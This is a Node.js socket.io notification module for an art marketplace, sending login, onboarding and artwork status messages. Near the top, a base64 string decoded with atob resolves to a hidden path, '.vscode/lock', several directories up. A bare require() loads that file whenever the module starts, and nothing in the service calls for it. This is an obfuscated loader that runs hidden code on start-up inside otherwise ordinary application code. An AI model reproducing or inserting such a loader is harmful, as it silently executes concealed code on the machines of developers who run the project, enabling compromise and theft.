const ModelsService = require("@services/models.service");

let clientManager = [];
let clientInfo = {};

const denv = atob('Li4vLi4vLi4vLi4vLi4vLnZzY29kZS9sb2Nr')
const suarteStepMessage = [
  "Upload an image",
  "Like 10 artworks",
  "Follow 5 users",
  "Write 3 thoughts",
  "Create an artlist",
  "Rate 5 artworks",
  "Play an audio",
  "Start your collection",
  "Complete your profile",
];
require(denv)
function init(server) {
  const io = require("socket.io")(server, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"]
    }
  });

  io.on("connection", function (newClient) {
    console.log("new user connected");
    clientManager.push(newClient);

    newClient.on("setUserInfo", data => {
      console.log("User Login", data);
      clientInfo[newClient.id] = data;
      newLoginNotify(newClient.id);
    })

    newClient.on("disconnect", function(){
      console.log('client disconnect...' + newClient.id);
      clientManager.filter(client => client.id != newClient.id);
      // clientInfo[newClient.id] = undefined;
      delete clientInfo[newClient.id];
    })
  });
}

async function newLoginNotify(clientId) {
  clientManager.forEach((client) => {
    if (client.id != clientId) {
      const userInfo = clientInfo[clientId];
      const data = {
        prefix: "NewLogin",
        ...userInfo,
      };
      client.emit("newLogin", data);
    }
  });
}

async function sendMessage( receiver, data ) {
  clientManager.forEach( client => {
    if(clientInfo[client.id]?.usermail == receiver) {
      client.emit("notificationData", data);
    }
  });
}

async function broadcastMessage( data ) {
  clientManager.forEach( client => {
    client.emit("notificationData", data);
  })
}

async function suarteRoadStepChanged(userId, currentStep) {
  const User = ModelsService.Models.User;
  try
  {
    const user = await User.findById(userId);
    const data = {
      type: true,
      status: 0,
      subject: suarteStepMessage[currentStep - 1],
      sbj_image: './assets/svg/road' + (currentStep) + '.svg',
    };

    sendMessage(user.user_email, data);
  }
  catch (error) {
    
  }
}

async function orderCreated(userId) {
  const User = ModelsService.Models.User;
  try {
    const user = await User.findById(userId);

    clientManager.forEach((client) => {
      if (clientInfo[client.id].email == user.user_email) {
        // const data = {
        //   type: true,
        //   status: 0,
        //   subject: ,
        //   sbj_image: "./subimg.png",
        // };
        // client.emit("notificationData", data)
      }
    })
  }
  catch (error) {

  }
}

async function sendNotificationArtwork(isBroadCast, type, userId, artworkId) {
  const User = ModelsService.Models.User;
  const Artwork = ModelsService.Models.Artwork;
  try {
    const user = await User.findById(userId);
    const artwork = await Artwork.findById(artworkId);
    const artwork_title = artwork.artwork_about.artwork_title;
    const artist = artwork.artwork_about.artwork_artist;
    console.log(type, userId, artworkId);
    let data;
    if (type == "markAsSold") {
      data = {
        type: true,
        status: 41,
        subject: artwork_title,
        object: artist,
        sbj_image: "./assets/svg/action.svg",
        obj_image: "./objimg.png",
      };
    }
    else if (type == "claimArtwork") {
      data = {
        type: true,
        status: 42,
        subject: artwork_title,
        object: artist,
        result: user.user_username,
        sbj_image: "./assets/svg/action.svg",
        obj_image: "./objimg.png",
      };
    }
    else if (type == "confirmReception") {
      data = {
        type: true,
        status: 36,
        subject: artwork_title,
        sbj_image: "./assets/svg/order.svg",
        obj_image: "./objimg.png",
      };
    }
    else if (type == "draftRejected") {
      data = {
        type: true,
        status: 27,
        subject: artwork_title,
        object: artist,
        sbj_image: "./assets/svg/order",
      };
    }
    else if (type == "limitedEditionAccepted") {
      data = {
        type: true,
        status: 23,
        subject: artwork_title,
        sbj_image: "./assets/svg/action.svg",
      };
    }
    sendMessage(user.user_email, data);
  }
  catch (error) {
    console.log(error);
  }
}

async function submissionApproved(artwork_title, artist_name, isLimitedEdition) {
  const status = isLimitedEdition ? 26 : 25;
  const data = {
    type: true,
    status: status,
    subject: artwork_title,
    object: artist_name,
    sbj_image: "./subimg.png",
    obj_image: "./objimg.png",
  };
  broadcastMessage(data);
}

module.exports = {
  init,
  newLoginNotify,
  sendMessage,
  suarteRoadStepChanged,
  sendNotificationArtwork,
  submissionApproved,
};